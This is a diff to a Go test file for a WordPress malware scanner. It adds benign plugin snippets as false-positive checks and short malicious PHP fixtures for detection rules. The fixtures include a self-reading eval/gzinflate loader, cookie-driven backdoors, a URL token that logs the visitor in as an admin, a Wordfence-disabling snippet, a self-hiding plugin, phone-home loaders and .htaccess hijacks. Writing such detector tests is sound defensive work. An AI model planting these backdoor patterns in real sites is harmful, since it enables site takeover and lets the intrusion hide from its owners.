@@ -313,6 +313,46 @@ func TestShippedRulesStayQuietOnLegitimateCode(t *testing.T) {
 	dir := t.TempDir()
 	write(t, dir, "plugins/simple-history/inc/services/class-stealth-mode.php",
 		"<?php\nadd_filter( 'all_plugins', [ $this, 'filter_all_plugins' ] );\n// Hide from the \"Go to Simple History\" link\nfunction filter_all_plugins( $plugins ) { if ( $this->is_stealth() ) { unset( $plugins[ $this->slug ] ); } return $plugins; }\n")
+	write(t, dir, "plugins/wp-google-maps/includes/class.plugin.php",
+		"<?php\n$csp = implode('', $csp);\n// Decided against this for beta launch\n// header_remove('Content-Security-Policy');\nheader($csp);\n")
+	write(t, dir, "plugins/wp-file-manager/lib/codemirror/mode/powershell/index.html",
+		"<!doctype html>\n<title>CodeMirror: Powershell mode</title>\n<meta charset=\"utf-8\"/>\n")
+	write(t, dir, "plugins/mts-wp-notification-bar/includes/constant-contact/guzzlehttp/promises/src/Promise.php",
+		"<?php\nswitch ($trans->state) {\n    case 'before': goto before;\n    case 'complete': goto complete;\n    case 'error': goto error;\n    case 'retry': goto retry;\n    case 'end': goto end;\n}\nbefore: $a = 1; complete: $b = 2; error: $c = 3; retry: $d = 4; end: return;\n")
+	write(t, dir, "plugins/pixelyoursite/modules/url-normalizer/Normalizer.php",
+		"<?php\nwhile (! empty($path)) {\n    $pattern_a   = '!^(\\.\\./|\\./)!x';\n    $pattern_b_1 = '!^(/\\./)!x';\n    $pattern_b_2 = '!^(/\\.)$!x';\n    $pattern_c   = '!^(/\\.\\./|/\\.\\.)!x';\n    $pattern_d   = '!^(\\.|\\.\\.)$!x';\n    $pattern_e   = '!^(/?[^/]*)!x';\n}\n")
+	write(t, dir, "plugins/woocommerce-jetpack/includes/functions/wcj-functions-number-to-words.php",
+		"<?php\nfunction convert_number_to_words( $number ) {\n\t$hyphen      = '-';\n\t$conjunction = ' and ';\n\t$separator   = ', ';\n\t$negative    = 'negative ';\n\t$decimal     = ' point ';\n\t$dictionary  = array( 0 => 'zero', 1 => 'one' );\n}\n")
+	write(t, dir, "plugins/wc-shippo-shipping/includes/Admin/OneTeamSoftware.php",
+		"<?php\nadd_menu_page('x', 'x', 'manage_options', $this->mainMenuId, array(&$this, 'display'), plugins_url('assets/images/icon.png', dirname(dirname(str_replace('phar://', '', __FILE__)))), 26);\n")
+	write(t, dir, "plugins/link-whisper-premium/core/Wpil/Dashboard.php",
+		"<?php\n$icon  = $item['icon'] ?? '!';\n$title = $item['title'] ?? '';\n$pill  = $item['pill'] ?? null;\n$review = $item['review'] ?? [];\n")
+	write(t, dir, "themes/pro/framework/functions/pro/stacks/starter/css/starter-typography.css",
+		"<?php /* Custom Fonts */ ?>\n\nbody,\ninput {\n  font-family: sans-serif;\n}\n")
+	write(t, dir, "plugins/mapsvg/php/Domain/Token/TokenController.php",
+		"<?php\n$userName = \"mapsvg\";\n$userEmail = \"support@mapsvg.com\";\n$user_id = wp_insert_user([\n\t\"user_login\" => $userName,\n\t\"user_pass\" => $random_password,\n\t\"user_email\" => $userEmail,\n\t\"role\" => \"administrator\",\n\t\"locale\" => \"en_US\"\n]);\n")
+	write(t, dir, "plugins/cryptopay-wc-lite/assets/js/evm-chains-provider.js",
+		"/*! ethers */function uint8ArrayToHexString(r){return r}const q={method:\"eth_call\",params:[t],jsonrpc:\"2.0\"};\n")
+	write(t, dir, "plugins/shortcode-exec-php/editarea/edit_area/edit_area_compressor.php",
+		"<?php\n$loader= preg_replace(\"/(t\\.scripts_to_load=\\s*)\\[([^\\]]*)\\];/e\", \"\\$this->replace_scripts('script_list', '\\\\1', '\\\\2')\", $loader);\n")
+	write(t, dir, "plugins/error-log-monitor/Elm/Plugin.php",
+		"<?php\n//Avoid race conditions.\n$handle = fopen(__FILE__, 'r');\nflock($handle, LOCK_EX);\nwp_cache_delete('alloptions', 'options');\n")
+	write(t, dir, "plugins/wp-defender/lib/packages/Symfony/Component/Process/Process.php",
+		"<?php\n// Workaround for the bug, when PTS functionality is enabled.\n$ptsWorkaround = fopen(__FILE__, 'r');\n$envPairs = [];\n")
+	write(t, dir, "plugins/uncanny-automator/vendor/composer/autoload_classmap.php",
+		"<?php\nreturn array(\n    'Uncanny_Automator\\\\Integrations\\\\Wordfence\\\\Wordfence_2fa_Deactivated' => $baseDir . '/src/integrations/wordfence/triggers/wordfence-2fa-deactivated.php',\n);\n")
+	write(t, dir, "plugins/uncanny-automator/src/integrations/wordfence/triggers/wordfence-2fa-deactivated.php",
+		"<?php\n/**\n * Fires when 2FA is disabled for a user, via the dedicated `wordfence_ls_2fa_deactivated` hook.\n */\nclass Wordfence_2fa_Deactivated {}\n")
+	write(t, dir, "plugins/one-time-login/one-time-login.php",
+		"<?php\nforeach ( $tokens as $i => $token ) {\n\tif ( hash_equals( $token, $_GET['one_time_login_token'] ) ) { $is_valid = true; unset( $tokens[ $i ] ); break; }\n}\nwp_set_auth_cookie( $user->ID, true, is_ssl() );\n")
+	write(t, dir, "plugins/surecart/app/src/Models/User.php",
+		"<?php\n$populate_cookie = function ( $logged_in_cookie ) { $_COOKIE[ LOGGED_IN_COOKIE ] = $logged_in_cookie; };\nadd_action( 'set_logged_in_cookie', $populate_cookie );\nwp_set_auth_cookie( $this->user->ID );\n")
+	write(t, dir, "themes/bricks/includes/integrations/form/actions/login.php",
+		"<?php\n$login_response = wp_signon( $creds, is_ssl() );\nif ( is_wp_error( $login_response ) ) { return; }\nwp_set_current_user( $login_response->ID );\nwp_set_auth_cookie( $login_response->ID, $remember );\n")
+	write(t, dir, "themes/bricks/includes/frontend.php",
+		"<?php\nupdate_user_meta( $user_id, 'bricks_user_activation_status', 'active' );\nif ( Database::get_setting( 'userActivationAutoLogin', false ) ) { wp_set_current_user( $user_id ); wp_set_auth_cookie( $user_id, false, is_ssl() ); }\n")
+	write(t, dir, "themes/jupiter/framework/admin/control-panel/logic/template-management.php",
+		"<?php\nupdate_user_meta( $user->ID, 'session_tokens', $session_tokens );\nwp_set_auth_cookie( $user_id, true );\ndo_action( 'wp_login', $user->user_login, $user );\n")
 	write(t, dir, "plugins/fusion-builder/inc/class-fusion-form-auth-actions.php",
 		"<?php\n$user = wp_signon( array( 'user_login' => $_POST['user'], 'user_password' => $_POST['pass'] ) );\nif ( ! is_wp_error( $user ) ) { wp_set_auth_cookie( $user_id, false, is_ssl() ); }\n")
 	write(t, dir, "plugins/jetpack/extensions/blocks/premium-content/_inc/subscription-service/class-jwt.php",
@@ -423,7 +463,6 @@ func TestShippedRulesCatchCorpusFamilies(t *testing.T) {
 		"plugins/a/db.php":                                  {"<?php $f='abc';$t='cba';for($j=0;$j<strlen($e);$j++){$p=strpos($t,$e[$j]);$r.=($p===false)?$e[$j]:$f[$p];}", "substitution-cipher-decoder"},
 		"plugins/a/index.php":                               {"<?php /** H3K | Tiny File Manager */ $copy_to = fm_clean_path($_POST['to']);", "tiny-file-manager"},
 		"themes/t/custom-functions.php":                     {"<?php $x = explode(chr((292-248)),'8811,64,8190,63,6142,30,5248,23,9512,68,9469,43,7867,44,8253,42,359,34,7687,22,1838,24');", "chr-arith-explode"},
-		"plugins/a/MessageCard.php":                         {"<?php foreach ($pills as $k) { $pill = $pills[$k]; echo $pill; }", "pills-spam-array"},
 		"plugins/a/repair_backup.php":                       {"<?php $currency = 'g,S)MH'; $invoke='co6I_';$eye='e';$cloture = '?_c';$dashing = 'r';$imperishable= 's';$freewheel ='a;dgLOs_'; $completion ='=';$fr0st='v';$cantors = 'aN)';", "dictionary-word-obfuscation"},
 		"themes/t/easypost.php":                             {"<?php $cfg = '{\"token_id\":\"ep_28e0dc8a825c43799a06a8e25c25d054\",\"token_verifier\":\"v1:ae2afe6c3d4870f8936cc8216d994168:c3959f407c\"}';", "easypost-toolkit"},
 		"uploads/css41.php":                                 {"<?php $qxnc=$_COOKIE;$tuw=$qxnc[rrti];if($tuw){ $xhdpw=$tuw($qxnc[nqcl]);$phkab=$tuw($qxnc[beic]);$kjrti=$xhdpw(\"\",$phkab);$kjrti();}", "cookie-callable-backdoor"},
@@ -447,7 +486,19 @@ func TestShippedRulesCatchCorpusFamilies(t *testing.T) {
 		"uploads/aioseo/logs/mlpghswk.php":                  {"<?php $above_midpoint_count = 'uv298l1'; $is_last_exporter = 'btdjq2'; $registration_log = 'gkjsl'; $searches = 'smy2pbogk';\nfunction column_comment($ts_prefix_len){ $allowSCMPXextended = 'zhstda9x'; include($ts_prefix_len); }", "include-parameter-with-junk-vars"},
 		"plugins/scanner-helper-pro/scanner-helper-pro.php": {"<?php $k='mDhr9QUcAsFA'; add_filter(d(hex2bin('1f2e3d4c5b6a')), 'a'); add_filter(d(hex2bin('a1b2c3d4e5f6')), 'b'); $u = d(hex2bin('00112233445566')); $v = d(hex2bin('ffeeddccbbaa99'));", "hex2bin-literal-obfuscation"},
 		"plugins/seocore/layout.css":                        {"<?php ?>", "php-stub-asset"},
-		"plugins/a/pills2.php":                              {"<?php foreach ($c as $k => $v) { $pill = $c[$k]; echo $pill; }", "pills-spam-array"},
+		"themes/x/cookie-check.php":                         {"<?php $tmp = \"2a7eb4d8e15f8d1c0ecb88ef28e5ab3b\"; $check = $_COOKIE[\"index\"]; if($tmp == md5($check)) { include 'x.php'; }", "cookie-md5-auth"},
+		"plugins/x/stealth.php":                             {"<?php add_filter('all_plugins', function ($plugins) { if (isset($_GET['sp'])) { return $plugins; } $current = plugin_basename(__FILE__); unset($plugins[$current]); return $plugins; });", "plugin-self-hiding"},
+		"themes/x/footer-ws.php":                            {"<?php add_action('wp_footer', function() { ?><script>var s = new top['W'['concat']('ebS', 'ock', 'et')]('wss://example.invalid');</script><?php });", "js-concat-obfuscated-websocket"},
+		"plugins/x/globals-c.php":                           {"<?php $zed52554 = 209;$GLOBALS['u47f90929']=Array();global $u47f90929;", "globals-array-obfuscation"},
+		"plugins/x/anylc.php":                               {"<?php $url = 'https://example.invalid/?v=' . urlencode($v) . '&site_url=' . urlencode(get_site_url()) . '&live=1'; $data = @file_get_contents($url); if (!$data) { return; }", "phone-home-loader"},
+		"plugins/x/async.php":                               {"<?php $username_b64 = $_COOKIE['admin_user_username'] ?? ''; $password_b64 = $_COOKIE['admin_user_password'] ?? ''; $id = wp_create_user(base64_decode($username_b64), base64_decode($password_b64), 'a@b.c');", "cookie-provisioned-admin"},
+		"themes/x/super.php":                                {"<?php $LnWYZK = \"\\163\".\"\\164\" .\"\\162\\137\\162\\157\" . \"\\164\" . 'x';", "octal-string-concat"},
+		"plugins/x/notes.php":                               {"<?php $url = hex2bin(\"68747470733A2F2F6578616D706C652E696E76616C69642F\"); ?>", "hex-encoded-url"},
+		"mu-plugins/nc-dropin.php":                          {"<?php ?><script>if(/x/.test(document.cookie)||/\\/wp-admin|\\/wp-login\\.php|wp-admin\\/|wp-login\\.php/i.test(location.pathname+location.search))return;if(window.__ncR)return;</script>", "nc-dropin-loader"},
+		"themes/x/fm-index.php":                             {"<?php if (!empty($res)) { $fun='fm_'.$res_lng; echo '<pre>'.$fun($res).'</pre>'; }", "php-file-manager-fm-prefix"},
+		"plugins/x/script-4aec0f13.php":                     {"<?php function i4aec0f13e8e5() { return 1; } function b9c1d2e3f4a5b6() { echo \"<script>\" . $js . \"</script>\"; }", "random-hex-function-names"},
+		"plugins/x/redirect.php":                            {"<?php if (!defined('CREDIT')) { $ctx=stream_context_create(array('http'=>array('timeout' => 3))); $credit=@file_get_contents('https://example.invalid/c.txt', false, $ctx); echo $credit; }", "credit-content-injection"},
+		"themes/x/filesman-index.php":                       {"<?php $default_action = 'filesman'; @define('SELF_PATH', __FILE__);", "webshell-names"},
 		"plugins/a/wp-lookalike.php":                        {"<?php $server_data = $_SERVER;  $imap_get_quotaroot_cron = 'hash_pbkdf2';  /*  %s: Plugin author. */  $esc_attr_rzz = 'HTTP_7051453';", "fake-header-key-backdoor"},
 		"plugins/x/FrmViewsCategory.php":                    {"<?PHp     //J+76d|sWBCM[kLO5VH1@g\" ` #<^_X)kp@Pm4(1XVmE#=ZZe/*J?aWNp1dl66lyL#\\`GTEgPy3[FW:*///0X=lq|MJ&9<Gj+[s<5J*ZNG5).\"%\\p\"mJ?[<<)gCC%j/0G#L\\N(//M'.P,kB.YlN5*k?r0bwzq(CuU D-8A-fH;8U'Zd`H4vR!6F1y?-reqUirE_oNcE  //OgP<q&YcZS)WCSo]ok~C\\d|b# DH589d!i\"sp\\WL1a$T5~\n'x.php';", "mixed-case-keyword"},
 		"plugins/wp-lastweets/vendor/composer/autoload_erlistrc-8Nw6M9.php": {"<?php class code_auth { function code2leng($start, &$data, &$data_long){ $tmp = unpack('N*', $data); foreach ($tmp as $v) $data_long[$start++] = $v; return $start; } function uncode($enc){ $keyone = $_SERVER['HTTP_USER_AGENT']; if(preg_match('/WebKit\\/(.*?) \\(KHTML/is',$keyone,$src)){ $key = str_replace('.','aGcE',$src[1]); }else{ die(); } return $key; } }", "ua-keyed-decoder"},
@@ -459,6 +510,10 @@ func TestShippedRulesCatchCorpusFamilies(t *testing.T) {
 		".htaccess":                      {"# BEGIN WordPress\nphp_value auto_prepend_file /home/u/public_html/wp-includes/.x.php\n", "htaccess-auto-prepend"},
 		"uploads/.htaccess":              {"<FilesMatch \"\\.(jpg|png)$\">\nSetHandler application/x-httpd-php\n</FilesMatch>\nAddType application/x-httpd-php .jpg\n", "htaccess-php-in-images"},
 		"themes/t/.htaccess":             {"RewriteEngine On\nRewriteCond %{HTTP_USER_AGENT} (google|bing|yahoo) [NC]\nRewriteCond %{REQUEST_URI} !admin\nRewriteRule ^(.*)$ http://example.invalid/pharma/$1 [R=301,L]\n", "htaccess-cloaked-redirect"},
+		"uploads/tail-loader.php":        {"<?php $d = file_get_contents(__FILE__); $p = substr($d, strpos($d, '#@#') + 3); eval(gzinflate(base64_decode($p))); #@#", "self-reading-file-backdoor"},
+		"plugins/x/kill-wf.php":          {"<?php if (is_dir(WP_PLUGIN_DIR . '/wordfence')) { deactivate_plugins('wordfence/wordfence.php'); rename(WP_PLUGIN_DIR . '/wordfence', WP_PLUGIN_DIR . '/wordfence_'); }", "wordfence-disabling"},
+		"uploads/2024/login.php":         {"<?php if ($_GET['k'] === 'x') { wp_set_auth_cookie(1, true); }", "unauth-admin-login"},
+		"themes/t/inc/helpers.php":       {"<?php add_action('init', function () { if (isset($_GET['tk']) && $_GET['tk'] === 'z') { $u = get_users(['role' => 'administrator', 'number' => 1]); wp_set_auth_cookie($u[0]->ID, true); } });", "theme-auth-cookie-backdoor"},
 		"uploads/wp-security-helper.php": {"<?php add_action(\"\\160\\162\\x65\\137\\147\\145\\x74\\137\\x75\\163\\145\\162\\163\", 'hide');", "hidden-user-query-hook-escaped"},
 	}
 	for rel, c := range cases {
@@ -479,6 +534,25 @@ func TestShippedRulesCatchCorpusFamilies(t *testing.T) {
 		if !found {
 			t.Errorf("%s: expected %s at high+, got %v", rel, c.rule, ids(by[rel]))
 		}
+	}
+}
+
+// The empty "<?php /**/ ?>" block a cleaner leaves behind is an indicator
+// that the file was once injected, not malware itself: medium, never high.
+func TestCleanupLeftoverStubIsMedium(t *testing.T) {
+	s := shippedRules(t)
+	dir := t.TempDir()
+	write(t, dir, "plugins/buddypress-docs/includes/templates/docs/single/sidebar.php", "<?php /**/ ?>\n<div id=\"doc-sidebar\">\n\n</div>\n")
+	write(t, dir, "plugins/x/ok.php", "<?php /** Plugin Name: Ok */ ?>\n<div></div>\n")
+	res := s.ScanDir(dir)
+	var got []Finding
+	for _, f := range res.Findings {
+		if f.RuleID == "cleanup-leftover-stub" {
+			got = append(got, f)
+		}
+	}
+	if len(got) != 1 || got[0].File != "plugins/buddypress-docs/includes/templates/docs/single/sidebar.php" || got[0].Severity != "medium" {
+		t.Fatalf("expected one medium cleanup-leftover-stub finding on sidebar.php, got %+v", got)
 	}
 }
 
